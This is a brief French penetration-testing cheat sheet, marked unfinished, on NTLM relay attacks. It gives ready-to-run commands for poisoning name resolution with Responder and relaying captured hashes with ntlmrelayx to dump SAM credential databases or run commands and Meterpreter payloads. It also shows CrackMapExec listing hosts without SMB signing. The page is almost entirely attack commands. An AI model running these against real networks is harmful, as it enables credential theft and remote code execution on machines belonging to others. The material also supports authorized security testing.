---
description: A finir
---

# NTLM Relay

Prendre la dernière version de Responder ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder))

### Ecoute passive

```
sudo python3 responder -I eth0
```

Les _hashs_ NT utilisé dans la version 1 et 2 du protocole NTLM (a.k.a Net-NTLMv1-SSP et Net-NTLMv2-SSP) peuvent être relayés.

### Relayer

Pour pouvoir relayer, il faut que les services SMB et HTTP de Responder soit stoppés (fichier de configuration Responder.conf). Ceci permet le bon fonctionnement de `ntlmrelayx`.

```
# Terminal 1 (dans le docker impacket)
Dumper la base SAM : ntlmrelayx -tf <TARGETS.txt>
Exécuter une commande : ntlmrelayx -tf <TARGETS.txt> -c <COMMANDE ou METERPRETER>

# Terminal 2
sudo python3 responder -I eth0 -d -w
```

#### TIPS

* `smb2support` : Option qui permet de supporter le protocole SMBv2

Le fichier `TARGETS.txt` contient les IP des machines dont la signature SMB n'est pas activée. Cette liste de machine peut être récupérée avec la commande suivante :&#x20;

```
cme smb <IP>/<MASK> --gen-relay-list <TARGETS.txt>
```
